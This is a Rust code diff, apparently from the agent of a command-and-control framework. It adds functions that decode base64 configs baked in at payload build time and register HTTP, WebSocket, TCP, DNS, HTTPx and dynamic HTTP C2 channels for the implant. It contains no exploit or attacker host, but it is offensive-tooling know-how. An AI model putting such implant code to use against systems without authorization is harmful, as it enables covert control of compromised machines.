@@ -122,6 +122,85 @@ pub fn initialize() {
     FAILED_CONNECTION_THRESHOLD.store(threshold, std::sync::atomic::Ordering::Relaxed);
 
     utils::print_debug(&format!("Initial egress order: {:?}", order));
+
+    // Register C2 profiles from compile-time config env vars
+    // Each env var is base64-encoded JSON set by builder.go during payload build
+    register_profiles_from_config(&BASE64);
+}
+
+/// Decode a base64 config string and deserialize into the target type
+fn decode_profile_config<T: serde::de::DeserializeOwned>(
+    b64_config: &str,
+    profile_name: &str,
+) -> Option<T> {
+    use base64::engine::general_purpose::STANDARD as BASE64;
+    use base64::Engine;
+
+    let bytes = match BASE64.decode(b64_config) {
+        Ok(b) => b,
+        Err(e) => {
+            utils::print_debug(&format!("Failed to decode {} config: {}", profile_name, e));
+            return None;
+        }
+    };
+    match serde_json::from_slice(&bytes) {
+        Ok(config) => Some(config),
+        Err(e) => {
+            utils::print_debug(&format!("Failed to parse {} config: {}", profile_name, e));
+            None
+        }
+    }
+}
+
+/// Register all C2 profiles that have compile-time configuration
+fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
+    // HTTP profile
+    if let Some(config_b64) = option_env!("C2_HTTP_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<http::HttpInitialConfig>(config_b64, "http") {
+            utils::print_debug("Registering HTTP profile");
+            register_available_c2_profile(Arc::new(http::HttpProfile::new(config)));
+        }
+    }
+
+    // Websocket profile
+    if let Some(config_b64) = option_env!("C2_WEBSOCKET_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<websocket::WebsocketInitialConfig>(config_b64, "websocket") {
+            utils::print_debug("Registering Websocket profile");
+            register_available_c2_profile(Arc::new(websocket::WebsocketProfile::new(config)));
+        }
+    }
+
+    // TCP profile
+    if let Some(config_b64) = option_env!("C2_TCP_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<tcp::TcpInitialConfig>(config_b64, "tcp") {
+            utils::print_debug("Registering TCP profile");
+            register_available_c2_profile(Arc::new(tcp::TcpProfile::new(config)));
+        }
+    }
+
+    // DNS profile
+    if let Some(config_b64) = option_env!("C2_DNS_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<dns::DnsInitialConfig>(config_b64, "dns") {
+            utils::print_debug("Registering DNS profile");
+            register_available_c2_profile(Arc::new(dns::DnsProfile::new(config)));
+        }
+    }
+
+    // HTTPx profile
+    if let Some(config_b64) = option_env!("C2_HTTPX_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<httpx::HttpxInitialConfig>(config_b64, "httpx") {
+            utils::print_debug("Registering HTTPx profile");
+            register_available_c2_profile(Arc::new(httpx::HttpxProfile::new(config)));
+        }
+    }
+
+    // Dynamic HTTP profile
+    if let Some(config_b64) = option_env!("C2_DYNAMICHTTP_INITIAL_CONFIG") {
+        if let Some(config) = decode_profile_config::<dynamichttp::DynamicHttpInitialConfig>(config_b64, "dynamichttp") {
+            utils::print_debug("Registering DynamicHTTP profile");
+            register_available_c2_profile(Arc::new(dynamichttp::DynamicHttpProfile::new(config)));
+        }
+    }
 }
 
 /// Start egress and P2P profiles
